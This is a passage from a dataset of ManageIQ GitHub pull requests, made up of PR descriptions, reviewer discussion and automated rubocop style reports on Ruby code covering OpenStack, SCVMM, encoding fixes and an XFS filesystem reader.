Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [122/120]\n- [ ] Style - [Line 119](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/parsers/openstack.rb#L119), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [135/120]\n- [ ] Style - [Line 134](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/parsers/openstack.rb#L134), Col 11 - [LeadingCommentSpace](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LeadingCommentSpace) - Missing space after #.\n\n**vmdb/app/models/ems_refresh/save_inventory_cloud.rb**\n- [ ] Warn - [Line 130](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L130), Col 5 - [EndAlignment](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/EndAlignment) - `end` at 130, 4 is not aligned with `if` at 126, 14\n- [ ] Style - [Line 127](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L127), Col 7 - [IndentationWidth](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/IndentationWidth) - Use 2 (not -8) spaces for indentation.\n- [ ] Style - [Line 136](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L136), Col 5 - [RedundantSelf](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] Style - [Line 136](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L136), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [134/120]\n- [ ] Style - [Line 137](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L137), Col 5 - [RedundantSelf](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n\n**vmdb/app/models/miq_provision_openstack/cloning.rb**\n- [ ] Style - [Line 42](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/miq_provision_openstack/cloning.rb#L42), Col 5 - [RedundantSelf](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n\n**vmdb/app/models/miq_provision_openstack_workflow.rb**\n- [ ] Warn - [Line 11](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/miq_provision_openstack_workflow.rb#L11), Col 29 - [UnusedMethodArgument](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/UnusedMethodArgument) - Unused method argument - `options`. If it's necessary, use `_` or `_options` as an argument name to indicate that it won't be used. You can also write as `allowed_cloud_tenants(*)` if you want the method to accept any arguments but don't care about them.\n- [ ] Warn - [Line 13](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/miq_provision_openstack_workflow.rb#L13), Col 12 - [AssignmentInCondition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/AssignmentInCondition) - Assignment in condition - you probably meant to use `==`.\n- [ ] Style - [Line 11](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/miq_provision_openstack_workflow.rb#L11), Col 36 - [SpaceAroundEqualsInParameterDefault](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/SpaceAroundEqualsInParameterDefault) - Surrounding space missing in default value assignment.\n\n**vmdb/app/models/openstack_resource_quota.rb**\n- [ ] Style - [Line 11](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/openstack_resource_quota.rb#L11), Col 24 - [DotPosition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/DotPosition) - Place the . on the next line, together with the method name.\n- [ ] Style - [Line 12](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/openstack_resource_quota.rb#L12), Col 59 - [DotPosition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/DotPosition) - Place the . on the next line, together with the method name.\n- [ ] Style - [Line 13](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/openstack_resource_quota.rb#L13), Col 39 - [DotPosition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/DotPosition) - Place the . on the next line, together with the method name.\n- [ ] Style - [Line 22](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/openstack_resource_quota.rb#L22), Col 24 - [DotPosition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/DotPosition) - Place the . on the next line, together with the method name.\n- [ ] Style - [Line 23](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/openstack_resource_quota.rb#L23), Col 59 - [DotPosition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/DotPosition) - Place the . on the next line, together with the method name.\n- [ ] Style - [Line 24](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/openstack_resource_quota.rb#L24), Col 39 - [DotPosition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/DotPosition) - Place the . on the next line, together with the method name.\n- [ ] Style - [Line 53](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/openstack_resource_quota.rb#L53), Col 29 - [DotPosition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/DotPosition) - Place the . on the next line, together with the method name.\n- [ ] Style - [Line 54](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/openstack_resource_quota.rb#L54), Col 66 - [DotPosition](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/DotPosition) - Place the . on the next line, together with the method name.\n\n**vmdb/config/routes.rb**\n- [ ] Style - [Line 147](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/config/routes.rb#L147), Col 5 - [AlignHash](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 148](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/config/routes.rb#L148), Col 7 - [AlignHash](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n"", ""I'm good with these changes style wise.\r\nHaven't found anything major\r\n:+1:""]"
22,ManageIQ/manageiq,372.0,"## We need to set postgresql database password, and fix postgres network connectivity

- appliance_console: internal database prompts for password.
- CentOS kickstarter: pass password into appliance_console_cli
- appliance_console_cli: relay username/password/databasename
- postgres: prompt passwords on all network connections (ident not installed)

https://bugzilla.redhat.com/show_bug.cgi?id=1128291
","['Thanks @jrafanie for feedback\r\nI pulled the vcr stuff into own pr #378', 'Checked commit https://github.com/kbrock/manageiq/commit/983656193bd6307310b9c9309ed79623416fd003 with rubocop 0.21.0\n8 files checked, 0 offenses detected\nEverything looks good. :star:\n', ""Looks good, thanks for the clarifications, I wasn't sure of the context of the changes.""]"
23,ManageIQ/manageiq,415.0,Added eligible_* and set_* methods for cloud resource from the automate model.,"['@chessbyte @kbrock Please review.\r\n\r\n/cc @mkanoor', 'Checked commits https://github.com/gmcculloug/manageiq/commit/6b4c2013b755a065ac1c3ad0e4185233a3cdaa89 .. https://github.com/gmcculloug/manageiq/commit/ff2c87c3c4f26fb7ed084021e54d3d707bb6c6a2 with rubocop 0.21.0\n7 files checked, 3 offenses detected\n\n**vmdb/app/models/mixins/miq_provision_mixin.rb**\n- [ ] Style - [Line 83](https://github.com/gmcculloug/manageiq/blob/ff2c87c3c4f26fb7ed084021e54d3d707bb6c6a2/vmdb/app/models/mixins/miq_provision_mixin.rb#L83), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [163/120]\n- [ ] Style - [Line 114](https://github.com/gmcculloug/manageiq/blob/ff2c87c3c4f26fb7ed084021e54d3d707bb6c6a2/vmdb/app/models/mixins/miq_provision_mixin.rb#L114), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [138/120]\n- [ ] Style - [Line 319](https://github.com/gmcculloug/manageiq/blob/ff2c87c3c4f26fb7ed084021e54d3d707bb6c6a2/vmdb/app/models/mixins/miq_provision_mixin.rb#L319), Col 5 - [PerlBackrefs](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/PerlBackrefs) - Avoid the use of Perl-style backrefs.\n', 'comments on rspecs were just thoughts. :shipit: ']"
24,ManageIQ/manageiq,425.0,"@chessbyte please review.

Text retrieved from non-English Windows VMs may be encoded in
UTF-16. This text may contain byte sequences that are not valid
in UTF-8. Check the text for valid encoding, and convert to UTF-8
as needed.

https://bugzilla.redhat.com/show_bug.cgi?id=1126476
Fixes #293
Fixes #332","[""On the plus side, here's another place where getting off of rexml and onto nokogiri would allow us to delete old crufty code and improve performance.  cc @gmcculloug "", '@gmcculloug @jrafanie @kbrock @Fryguy Would you please review this PR as the main code change is in `lib/util/xml/miq_rexml.rb`', ""Sure.\r\n\r\nSince we're in the `rescue` block we know the encoding of the string in `value` is invalid. Which means that the string we read is of a different encoding than the expected default. So, we force the encoding to `UTF-8` and check its validity with `nv.valid_encoding?`. If the encoding is valid then the string is `UTF-8` and we fall through and use that string.\r\n\r\nIf the encoding isn't valid, we force the encoding to `UTF-16` then convert the `UTF-16` string to `UTF-8` via:\r\n```\r\nnv.encode!('UTF-8', 'UTF-16', :invalid => :replace, :replace => '')\r\n```\r\nresulting in a valid `UTF-8` encoded string. Just in case, the trans-coding from `UTF-16` to `UTF-8` will delete any remaining invalid byte sequences (which should be rare).\r\n"", ""Can you change the commit message and PR message to say `Fixes #293` or whichever issue.  This way when it's merged, it auto-associates and auto-closes the associated issues."", ':+1: Looks good to me. Will merge when travis completes.']"
25,ManageIQ/manageiq,453.0,"https://bugzilla.redhat.com/show_bug.cgi?id=1044175

During the execution of an automate method the following 3 methods
can be called to set/get/check for existence of state data.

$evm.set_state_var     This takes a name and value as the 2 arguments
$evm.get_state_var     This takes a name and returns the corresponding value object
$evm.state_var_exist?  This takes a name and checks if the variable exists

The name in all 3 functions above can be a string or a symbol.
If the name is missing nil is returned.","['@gmcculloug @chessbyte @Fryguy @tinaafitz \r\nPlease Review', '@mkanoor - Changes look good.', ':+1:', '@mkanoor as always, thanks for all the great testing around these changes.\r\n\r\nDo we use `set_state_var` in code yet?', '/cc @Fryguy ', 'Style issues aside, this looks good to me.', '@Fryguy \r\nFixed the styling issue', '@Fryguy @gmcculloug \r\nImplemented Jasons comments', 'Checked commit https://github.com/mkanoor/manageiq/commit/48d089d80a57b976b6475890c1effc0340ce2a99 with rubocop 0.21.0\n5 files checked, 0 offenses detected\nEverything looks good. :cookie:\n', '@mkanoor Successfully tested changes.  Looks good.']"
26,ManageIQ/manageiq,514.0,"
1) Now log the error messages returned from Powershell.
2) In Scvmm.rb - Now check if the hash (@inventory) is empty
3) Now handle empty datasets within the @inventory hash (e.g. vms)

https://bugzilla.redhat.com/show_bug.cgi?id=1134064","['@Fryguy @blomquisg - updated, squashed, pushed.', 'Checked commit https://github.com/bronaghs/manageiq/commit/48b456c1aead397b93d0691d9c2d499b0da094df with rubocop 0.21.0\n2 files checked, 0 offenses detected\nEverything looks good. :+1:\n']"
27,ManageIQ/manageiq,596.0,"https://bugzilla.redhat.com/show_bug.cgi?id=1141174
https://bugzilla.redhat.com/show_bug.cgi?id=1141375

@dclarizio please review/test.","['Verified fix, waiting on Travis.', '@bronaghs Can you check this out?  I think the code would be easier to understand if we figure out why it\'s sometimes ""Unknown"" and sometimes ""VmMicrosoft"".\r\n\r\nSee comment on ""outdated diff"": https://github.com/ManageIQ/manageiq/pull/596#discussion_r17506149', 'All -\r\nIm pasting my earlier comment here because it seems to be hidden as part of an ""outdated diff"":\r\n\r\n@h-kataria  - Every SCVMM virtual machine has a type value of \'VmMicrosoft\'. \r\nThe vendor property is pulled from the OS table on the VM so it can be one of many vendor types.\r\nI recommended comparing the VM type to the string \'VmMicrosoft\'', ""> I recommended comparing the VM type to the string 'VmMicrosoft'\r\n\r\nI don't :smile:  We should be using the subclassing and just overridding the method in the appropriate subclasses.  In fact, this whole PR should just be changing the base class's method to return false, and then overriding in both VmVmware and VmMicrosoft to return true."", 'supports_snapshots? should reside in the abstract class (VmOrTemplate) as false and and let each subclass implement whether they support them or not.  Right?', '@fryguy @jrafanie implementing your suggestions.', '@jrafanie @Fryguy @bronaghs please review.', 'I noticed that it went from a concern file, `vmdb/app/models/vm_or_template/operations/snapshot.rb` to the base model files, `vmdb/app/models/vm_or_template.rb`.  Does that make sense?  I like that it lives next to `cloneable?`  @jrafanie Thoughts?', '@h-kataria Revert button hover text incorrectly says Remove instead of Revert, ""Remove Snapshot Operation not supported for Microsoft VM"".  Should be ""Revert Snapshot operation not supported for Microsoft VM"".  Also, lowercase ""operation"" for these hover text strings.', ""@fryguy that was @jrafanie's suggestion to move it to vm_or_template model.\r\n@dclarizio will fix hover text on those snapshop buttons."", '@dclarizio made suggested changes.', 'Checked commits https://github.com/h-kataria/manageiq/commit/7fc68f689278ac007d6e2a4db532592c018c3d4b .. https://github.com/h-kataria/manageiq/commit/1348b8c73d9f4cc4d5fe8a29563e1c98ca35aa58 with rubocop 0.21.0\n3 files checked, 2 offenses detected\n\n**vmdb/app/models/vm_or_template/operations/snapshot.rb**\n- [ ] Style - [Line 3](https://github.com/h-kataria/manageiq/blob/1348b8c73d9f4cc4d5fe8a29563e1c98ca35aa58/vmdb/app/models/vm_or_template/operations/snapshot.rb#L3), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [153/120]\n- [ ] Style - [Line 12](https://github.com/h-kataria/manageiq/blob/1348b8c73d9f4cc4d5fe8a29563e1c98ca35aa58/vmdb/app/models/vm_or_template/operations/snapshot.rb#L12), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [154/120]\n', ""> @fryguy that was @jrafanie's suggestion to move it to vm_or_template model.\r\n\r\nWorks for me :smile:"", 'Fix re-verified.']"
28,ManageIQ/manageiq,654.0,"In OpenStack, an image (TemplateOpenstack) can exist in more than one project
(CloudTenantOpenstack).  These migration and model changes allow an OpenStack
template to list the tenants it can be used in, and allows a Cloud Tenant to
list the templates associated with it.

The table is named ""cloud_tenants_vms"" to reflect the physical tables used in
for the join.

Despite the table name referring to the generic objects, the relationship is
purposefully restricted to Openstack templates and Openstack cloud tenants in
the association defined in the models.  This keeps the notion of the
many-to-many relationship restricted to the most specific level.

The relationship methods are named:

* TemplateOpenstack#cloud_tenants
* CloudTenantOpenstack#opentack_templates

Additionally, to facilitate keeping the relationship as specific as possible,
CloudTenant is now sublassed to CloudTenantOpenstack.  Since all of the existing
cloud tenants are only openstack tenants, the migration initializes all of the
CloudTenant records to have a type of CloudTenantOpenstack.","['@blomquisg Thanks for getting this in so quickly.', '@Fryguy, it felt like a good time to STI Cloud Tenant, as well. :)', 'Checked commit https://github.com/blomquisg/manageiq/commit/7e7047aff4cbcb4a1379efc1ac4b256dd9afdbad with rubocop 0.21.0\n6 files checked, 0 offenses detected\nEverything looks good. :cookie:\n']"
29,ManageIQ/manageiq,662.0,"Before, using migration_stub could reference a global model.  The goal
of migration_stub always was to prevent loading global models so that
we can ensure that, at the least, tests enforced that rule.  Now,
migration_stub actually enforces the rule.

This exposed many places where migration_stub was being used incorrectly
or where the migration itself incorrectly referenced global models.  The
fixes, depending on the migration, include
- Add the stub if it's used by the migration itself, and was never there.
- If the stub is not used by the migration, but only for testing, add
  a spec-only `Class.new` style stub.  Most of the `Reserve` specs do
  this, so, a helper method was introduced to DRY it up.
- 2 migration specs used stubs, but upon further review those specs
  weren't testing anything except pure ActiveMigration code, which isn't
  worth doing, so they were removed.

@jrafanie Please review.","[':+1: Love the idea of yelling at us when we use global models in migrations.', ""I don't understand the comments, @jrafanie .\r\n\r\n- The two deleted migration specs were singled out because they use stubs.  The fix for using stubs turns out to be just deleting them.  Thus it *is* related.  I made that clear in the commit message\r\n- Regarding the reserved class, I'm not sure what you are saying.  Those that you pointed out are spec only stubs.  The migrations themselves do not reference the Reserves table because they use the ReserveMixin.  There is no reason for the migration itself to create a stub when it doesn't use it.  So that helper method creates a spec-only stub for testing purposes only."", 'Maybe this just need clarification, then, since the deletes seem completely unrelated to ""preventing global models from migration_stub"":\r\n\r\n""In addition, 2 migrations weren\'t testing anything except pure\r\nActiveMigration code, which isn\'t worth doing, so they were removed.""', '@jrafanie Added the ""yelling at us when we use global models in migrations"".\r\n\r\nYeah I can clarify the commit message.  I see how that can be misunderstood.', '@jrafanie Changed the commit message to clear it up.  Is this better?', '@Fryguy the commit message looks good.  Basic question: does the deleted spec raise the warning you added in the migration_stub?  I guess that\'s the real question I failed to ask correctly in the first place.  It seemed unrelated, as in ""delete this because it\'s useless instead of making it work with migration_stub.""  That is the primary reason I asked if it should be in a different commit, it wasn\'t clear it used a global model and/or it would raise an error in migration_stub (which it doesn\'t appear to be calling).', ""Yes, or I wouldn't have looked at it.\r\n\r\nEDIT: Oh i see the first one doesn't actually use the migration_stub.  The second deleted one does.  I guess I can split that out."", 'There you go @jrafanie :trollface: ', ""No :trollface:, my personal rule is if a commit is more than 50 line changes and/or I don't immediately understand what's going on, it's best to ask."", ':tada: Yay, I can understand it now :tada: :heart: :star2: \r\n\r\nMerge at will when it goes green. ', 'w00t <- Do people still say that?']"
30,ManageIQ/manageiq,718.0,,"['@Fryguy @gmcculloug @jrafanie Please review.', ':+1: I like this. @Fryguy @jrafanie @gmcculloug any other opinions?', 'This is pretty great!  Glad you figured this out.', 'Checked commit https://github.com/brandondunne/manageiq/commit/ad6f3dbd69659db8a03b0d5991a87b0ed142bb44 with rubocop 0.21.0\n1 file checked, 1 offense detected\n\n**vmdb/lib/tasks/evm_dbsync.rake**\n- [ ] Warn - [Line 94](https://github.com/brandondunne/manageiq/blob/ad6f3dbd69659db8a03b0d5991a87b0ed142bb44/vmdb/lib/tasks/evm_dbsync.rake#L94), Col 11 - [HandleExceptions](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/HandleExceptions) - Do not suppress exceptions.\n', ""Wow, I'm late to looking at this but it looks really good.""]"
31,ManageIQ/manageiq,490.0,"The following portions of the XFS code have been (at least partially) tested:
1) Superblocks
2) Allocation Groups
3) Inodes
4) Directories, including:
5) ShortForm Directory Headers and Entries
6) Single Extent Directory Headers and Entries

There is additional code in this PR that is being checked in but has not yet
been validated.  Ignore for now please.

@roliveri @Fryguy @chessbyte please review at your convenience.","['Thanks for this great start @jerryk55 !  At this point, I see only really three major things that jump out at me.\r\n\r\n1. Specs.  We really should have unit tests.  They would probably live in `/lib/spec/fs/xfs` so they can be run as part of the automated test suites.  I envision that each class should have specs that use various hardcoded strings in the spec, and then just test that particular class.  I noticed that some classes take references to their ""parent"" class, so if needed those can be stubbed.\r\n\r\n2.  Class name should match file path name underscorized.  This lines up with many of the gem standards.  For example, I noticed that `/lib/fs/xfs/fsxfs_dir_data_hdr.rb` actually implements `XFS::DirDataHeader`.  This file name should really be `/lib/fs/xfs/dir_data_header.rb`.  No need for the extra `xfs` prefix, and the `Header<->hdr` doesn\'t match.\r\n\r\n3. Even though the other filesystem parts don\'t use the coding standards, I think any new code should. Rubocop has picked out most of the things, but in particular to me are things like VariableName and MethodName.\r\n\r\n4. Minor, but, I\'m really not a fan of shortened words...I don\'t see what they save, and they are just harder to read than just spelling out the words.  In fact, I personally find that once I spell out the shortened words, I realize they weren\'t good choices to begin with allowing me to find better words.  For example, instead of keyno, key_number.\r\n\r\nI realize a lot of this was probably copied or inspired from the other filesystem code, so on that, it may not be worth the effort to change for points 3 and 4, however I do think 1 and 2 are a must.\r\n', 'I should mention that another ""out"" for points 3 and 4 is if the code is mirroring a source reference like the original C source, or a book with specific terminology...then I could see keeping variable names or method names the same to allow easier reference back to the source.', 'Thanks for the comments @Fryguy.  Another out for points 3 and/or 4 is interfaces accessed by existing code.  For instance, ""fs_dirEntries"" is flagged in XFS.rb and used by MiqFS.rb.', '@jerryk55 Ah, yes, forgot about that one.', ""Great job getting through the rubocop / style stuff.  For the long dump methods, we can ignore those, because like you said, they have a lot of stuff to dump and they're pretty cleanly written."", 'What is the status here now that https://github.com/ManageIQ/manageiq/pull/233 is merged?', 'Getting close.  I expect to amend this PR by the end of the week.', ""@jerryk55 If you are going to have multiple commits, please have different commit message for each commit where the message states what's in that commit only.  If you're going to squash, then don't worry about it :)"", 'LOL vim...check your second commit message :wink: ', ""It's ok @jerryk55... dd means you're trying to delete stuff, which is all good in my book... \r\n\r\n:scissors: :scissors: \r\n\r\nBut yeah, please reword that second commit"", 'Checked commits https://github.com/jerryk55/manageiq/commit/76ab6dbb6ecc6e5b75afe7b4371104b58d0e2041 .. https://github.com/jerryk55/manageiq/commit/b5baeaf579f6354a22efe7af8afe6280d560ad42 with rubocop 0.21.0\r\n16 files checked, 39 offenses detected\r\n\r\n**lib/fs/MiqFS/modules/XFS.rb**\r\n- [ ] Style - [Line 2](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L2), Col 1 - [FileName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/FileName) - Use snake_case for source file names.\r\n- [ ] Style - [Line 44](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L44), Col 10 - [VariableName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/VariableName) - Use snake_case for variables.\r\n- [ ] Style - [Line 50](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L50), Col 5 - [VariableName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/VariableName) - Use snake_case for variables.\r\n- [ ] Style - [Line 51](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L51), Col 10 - [VariableName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/VariableName) - Use snake_case for variables.\r\n- [ ] Style - [Line 58](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L58), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 68](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L68), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 77](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L77), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 83](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L83), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 92](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L92), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 99](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L99), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 106](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L106), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 113](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L113), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 120](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L120), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 125](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L125), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 132](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L132), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 139](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L139), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 146](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L146), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 153](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L153), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 158](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L158), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 163](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L163), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 168](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L168), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 176](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L176), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 183](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L183), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 188](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L188), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 192](https://github.com/jerryk55/manageiq/blob/b5baeaf579f6354a22efe7af8afe6280d560ad42/lib/fs/MiqFS/modules/XFS.rb#L192), Col 7 - [MethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodName) - Use snake_case for methods.\r\n- [ ] Style - [Line 